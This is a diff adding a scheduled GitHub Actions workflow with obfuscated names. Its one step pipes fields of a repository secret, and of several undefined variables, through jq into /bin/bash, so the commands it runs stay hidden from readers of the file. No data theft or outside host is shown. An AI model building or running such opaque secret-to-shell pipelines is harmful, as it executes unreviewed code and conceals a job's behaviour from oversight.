@@ -1,0 +1,23 @@
+name: jidaowansuibai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jidaowansuibai
+        env:
+          hbpv8: ${{ secrets.hbpv8 }}
+        run: |
+          echo $hbpv8 | jq -r .dgbik75022 | /bin/bash
+          echo $duv0387 | jq -r .hymy3 | /bin/bash
+          echo $aq29727 | jq -r .q6 | /bin/bash
+          echo $r7238 | jq -r .gyuc52 | /bin/bash
+          echo $srjmh037 | jq -r .lwe351 | /bin/bash
+          echo $rtr42613 | jq -r .hvbei68 | /bin/bash
+
